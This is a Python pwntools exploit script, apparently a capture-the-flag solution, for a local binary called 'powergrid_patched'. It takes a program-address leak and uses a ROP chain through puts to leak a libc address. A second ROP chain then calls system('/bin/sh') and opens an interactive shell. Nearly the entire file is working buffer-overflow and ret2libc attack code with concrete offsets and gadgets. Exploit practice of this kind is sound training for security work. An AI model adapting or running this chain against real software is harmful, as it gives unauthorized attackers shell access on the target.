#!/bin/python3

from pwn import *

elf = ELF("./powergrid_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

def debugger(): 
	pause()
	gdb.attach(proc, gdbscript="", gdb_args=["-ix", "/home/kaligula/.gdbinit_pwndbg"])
	pause()

proc = process([elf.path])

## Get leak
proc.recvuntil(b">> ")
proc.sendline(b"5")
proc.recvuntil(b"number: ")
leak = int(proc.recvline().strip(b"\n").decode("utf-8"), 16)
log.info("Program text leak: " + hex(leak))

## Get text base
text_base = leak - 0x1189
log.info("Base: " + hex(text_base))

## Get GOT puts
got_puts = leak + 0x2e77
log.info("GOT puts: " + hex(got_puts))

## Get PLT puts
plt_puts = leak - 0x159
log.info("PLT puts: " + hex(plt_puts))

padding = cyclic(cyclic_find("caae"))
rop = p64(text_base + 0x000000000000125d) ## pop rdi ; ret
rop += p64(got_puts)
rop += p64(plt_puts)
rop += p64(leak) ## get_command

payload = padding + rop

proc.sendline(payload)
proc.recvline()
libc_puts = u64(proc.recvline().strip(b"\n") + b"\x00\x00")
log.info("Libc puts: " + hex(libc_puts))
libc_base = libc_puts - 0x87bd0
log.info("Libc base: " + hex(libc_base))
libc_sh = libc_base + next(libc.search(b"/bin/sh"))
log.info("Libc sh string: " + hex(libc_sh))
libc_system = libc_base + libc.sym["system"]
log.info("Libc system: " + hex(libc_system))
libc_exit = libc_base + libc.sym["exit"]
log.info("Libc exit: " + hex(libc_exit))

#debugger()

padding = cyclic(cyclic_find("caae"))
rop2 = p64(text_base + 0x0000000000001016) ## ret for alignment
rop2 += p64(text_base + 0x000000000000125d) ## pop rdi ; ret
rop2 += p64(libc_sh)
rop2 += p64(libc_system)
rop2 += p64(libc_exit)

payload2 = padding + rop2
proc.sendline(payload2)

proc.interactive()
proc.close()
